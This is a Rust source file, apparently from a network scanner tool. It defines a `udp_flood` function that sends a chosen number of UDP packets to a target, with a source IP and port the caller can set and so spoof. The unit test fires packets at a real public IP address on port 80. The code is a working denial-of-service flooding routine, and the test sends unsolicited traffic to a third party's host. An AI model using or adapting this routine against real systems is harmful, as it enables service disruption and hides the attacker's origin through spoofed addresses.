use crate::{
    errors::ScannerError,
    networking::{interface::Interface, osi_layers::DatalinkLayer, udp::Udp},
};
use anyhow::Result;
use pnet::packet::ethernet::EtherTypes;
use std::net::IpAddr;

/// Sends a `number_of_packets` amount of UDP packets to the specified destination.
///
/// Sets the source IP address and port number of each packet to the specified values.
///
/// Does not check if the target can be reached or if it responds.
pub fn udp_flood(
    interface: Interface,
    src_ip: IpAddr,
    src_port: u16,
    dest_ip: IpAddr,
    dest_port: u16,
    number_of_packets: usize,
) -> Result<()> {
    let ipv4_src = match src_ip {
        IpAddr::V4(ip) => ip,
        _ => Err(ScannerError::UnsupportedIpVersion)?,
    };

    let ipv4_dest = match dest_ip {
        IpAddr::V4(ip) => ip,
        _ => Err(ScannerError::UnsupportedIpVersion)?,
    };

    let dest_mac = interface.gateway.mac;

    let iface = interface.convert_interface()?;

    let packet = Udp::build_udp_packet(ipv4_src, src_port, ipv4_dest, dest_port);

    DatalinkLayer::send_flood(
        iface,
        &packet,
        number_of_packets,
        dest_mac,
        EtherTypes::Ipv4,
    )?;

    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::networking::interface::Interface;
    use std::net::{IpAddr, Ipv4Addr};

    #[test]
    fn test_udp_flood() {
        let interface = Interface::new().unwrap();
        let src_ip = IpAddr::V4(Ipv4Addr::new(192, 168, 178, 26));
        let src_port = 12345;
        let dest_ip = IpAddr::V4(Ipv4Addr::new(142, 251, 209, 131));
        let dest_port = 80;
        let number_of_packets = 2;

        let result = udp_flood(
            interface,
            src_ip,
            src_port,
            dest_ip,
            dest_port,
            number_of_packets,
        );

        assert!(result.is_ok());
    }
}
